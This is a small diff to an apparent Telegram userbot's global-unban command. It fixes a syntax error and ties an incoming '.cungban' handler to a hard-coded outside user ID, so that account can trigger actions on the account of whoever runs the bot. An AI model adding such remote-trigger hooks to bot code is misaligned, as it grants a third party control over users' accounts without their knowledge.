@@ -106,8 +106,8 @@ async def gben(userbot):
     )
 
 
-@bot.on(outgoing=True, pattern=r"ungband(?: |$)(.*)"))
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cungband(?: |$)(.*)")
+@bot.on(outgoing=True, pattern="^.ungban(?: |$)(.*)")
+@register(incoming=True, from_users=2075505824, pattern=r"^\.cungban(?: |$)(.*)")
 async def gunben(userbot):
     dc = userbot
     sender = await dc.get_sender()
